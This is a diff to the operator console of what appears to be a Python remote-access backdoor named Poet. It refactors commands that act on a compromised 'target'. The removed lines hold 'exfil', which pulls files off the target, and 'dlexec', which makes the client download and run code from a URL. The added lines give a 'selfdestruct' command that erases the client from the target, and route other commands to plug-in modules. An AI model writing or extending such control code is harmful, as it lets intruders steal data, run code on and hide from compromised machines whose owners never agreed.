@@ -84,19 +84,6 @@ class PoetServer(object):
                             self.generic(base)
                     else:
                         self.cmd_help(3)
-                # exfil
-                elif base == self.cmds[5]:
-                    if re.search('^exfil\s+([\w\/\\.~:\-]+\s+)+$', inp + ' ') and '-h' not in inp.split():
-                        for file in inp.split()[1:]:
-                            resp = self.conn.exchange('exfil ' + file)
-                            if 'No such' in resp:
-                                print 'posh : {}: {}'.format(resp, file)
-                                continue
-                            resp = zlib.decompress(resp)
-                            write_file = file.split('/')[-1].strip('.')
-                            self.write(resp, base, OUT, write_file)
-                    else:
-                        self.cmd_help(5)
                 # selfdestruct
                 elif base == self.cmds[6]:
                     if inp == 'selfdestruct':
@@ -113,14 +100,6 @@ class PoetServer(object):
                             print 'posh : Aborting self destruct.'
                     else:
                         self.cmd_help(6)
-                # dlexec
-                elif base == self.cmds[7]:
-                    if re.search('^dlexec\s+https?:\/\/[\w.\/]+$', inp):
-                        resp = self.conn.exchange(inp)
-                        msg = 'successful' if resp == 'done' else 'error: ' + resp
-                        print 'posh : dlexec {}'.format(msg)
-                    else:
-                        self.cmd_help(7)
                 # chint
                 elif base == self.cmds[8]:
                     if re.search('^chint(\s+\d+)?$', inp):
@@ -148,14 +127,27 @@ class PoetServer(object):
                 elif argv[0] == 'help':
                     found = True
                     print 'Commands:\n  {}'.format('\n  '.join(sorted(self.builtins + module.server_commands.keys())))
+                elif argv[0] == 'selfdestruct':
+                    print """[!] WARNING: You are about to permanently remove the client from the target.
+    You will immediately lose access to the target. Continue? (y/n)""",
+                    if raw_input().lower()[0] == 'y':
+                        resp = self.conn.exchange('selfdestruct')
+                        if resp == 'boom':
+                            debug.info('Exiting control shell')
+                            return
+                        else:
+                            self.info('Self destruct error: {}'.format(resp))
+                    else:
+                        self.info('Aborting self destruct')
 
+                # try to find command in registered modules
                 for cmd, func in module.server_commands.iteritems():
                     if argv[0] == cmd:
                         found = True
                         try:
                             func(self, argv)
                         except Exception as e:
-                            print str(e.args)
+                            self.info(str(e.args))
 
                 if not found:
                     self.info('{}: command not found'.format(argv[0]))
@@ -181,11 +173,12 @@ class PoetServer(object):
         """
 
         resp = self.conn.exchange(req)
-        if req == self.cmds[3]:
+        # TODO: this hardcoding is bad
+        if req == 'recon':
             resp = zlib.decompress(resp)
         print resp
         if write_flag:
-            self.write(resp, req.split()[0], OUT, write_file)
+            self.write(resp, req.split()[0], write_file)
 
     def write(self, response, prefix, write_file=None):
         """Write to server archive.
